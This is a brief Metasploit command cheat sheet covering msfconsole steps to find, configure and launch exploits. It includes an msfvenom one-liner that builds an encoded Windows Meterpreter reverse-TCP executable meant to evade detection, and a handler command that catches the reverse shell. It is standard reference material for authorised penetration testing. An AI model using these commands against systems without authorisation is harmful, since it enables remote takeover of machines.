# To show all exploits that for a vulnerability
grep <vulnerability> show exploits

# To select an exploit to use
use <exploit>

# To see the current settings for a selected exploit
show options

# To see compatible payloads for a selected exploit
show payloads

# To set the payload for a selected exploit
set payload <payload>

# To set setting for a selected exploit 
set <option> <value>

# To run the exploit
exploit

# One liner to create/generate a payload for windows
msfvenom --arch x86 --platform windows --payload windows/meterpreter/reverse_tcp LHOST=<listening_host> LPORT=<listening_port> --bad-chars “\x00” --encoder x86/shikata_ga_nai --iterations 10 --format exe --out /path/

# One liner start meterpreter
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <listening_host>;set LPORT <listening_port>;run;"
